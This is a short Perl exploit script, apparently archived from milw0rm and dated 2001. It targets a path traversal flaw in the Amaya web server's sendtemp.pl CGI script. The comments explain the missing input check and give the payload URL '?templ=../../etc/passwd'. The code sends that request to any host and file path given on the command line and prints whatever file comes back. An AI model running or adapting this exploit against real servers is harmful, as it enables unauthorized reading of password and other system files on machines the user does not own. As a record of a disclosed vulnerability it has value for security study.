@@ -1,0 +1,58 @@
+#!/usr/bin/perl -w
+
+# sendtemp.pl: A part of the Amaya Web development
+# server contains a file disclosure  vulnerability, 
+# which allows remote, read access to files 
+# on the servers file system,  as whichever 
+# user the httpd is running as.
+#
+# The Vulnerability is really quite simple..
+# When the `templ` argument is past to
+# sendtemp.pl it adds a link to the chosen stylesheet
+# and a META field containing the publication's 
+# URL of the new file to the chosen template.
+# For example:
+# http://localhost/cgi-bin/sendtemp.pl?templ=template.xml
+# This is all well and good,  however.. 
+# There is no sanity checking on the param you pass to the script..
+# Ie: my $temp_file = param("templ");
+#
+# So by simply issuing a GET to:
+# "http://localhost/cgi-bin/sendtemp.pl?templ=../../etc/passwd"
+# The systems file system can be traversed and the passwd file can be read. 
+# (Assuming the http daemon hasn't been run under chroot())
+#
+# Follows is a simple exploit.. however, its just as easy 
+# to do this manually in your web browser.
+# I really couldnt be bothered to format the output in any way,
+# It only encourages script kiddies.
+#
+# Finally, "l33t hax0r greetz" to..
+# ne0h, b0red, loophole, shad0w and the old dL crew..
+# Scott, Jim, Mike.. All of the guys at Global Intersec.
+#
+# Tom Parker - tom@rooted.net
+# MRX of HHP-Programming (www.hhp-programming.net)
+# Global InterSec INC California - Security Audits, Penetration testing, code auditing.
+
+use IO::Socket;
+print qq~
+----------------------------------------------------------
+W3.ORG sendtemp.pl exploit by Tom Parker - tom\@rooted.net
+    MRX of HHP-Programming (www.hhp-programming.net)
+	  -  Global InterSec INC California -
+----------------------------------------------------------
+~;
+if((!defined($ARGV[0]))||(!defined($ARGV[1]))) { print "Usage\: \%filename\.pl \<hostname\> \<file-to-get\>\n"; exit 0; }
+$SOCKET = IO::Socket::INET->new("$ARGV[0]:80");
+print $SOCKET "GET /cgi-bin/sendtemp.pl?templ=$ARGV[1]\n";
+print "Sent request for $ARGV[1] (http://$ARGV[0]/cgi-bin/sendtemp.pl\?templ\=$ARGV[1])\n";
+while(<$SOCKET>) {
+push @DATA, $_;
+
+}
+my $woot = join(' ',@DATA);
+if($woot =~/$ARGV[1] wasn't found/) { print "$ARGV[1] dosnt seem to exist.\n"; exit 0; } 
+else { print "@DATA"; }
+
+# milw0rm.com [2001-03-04]
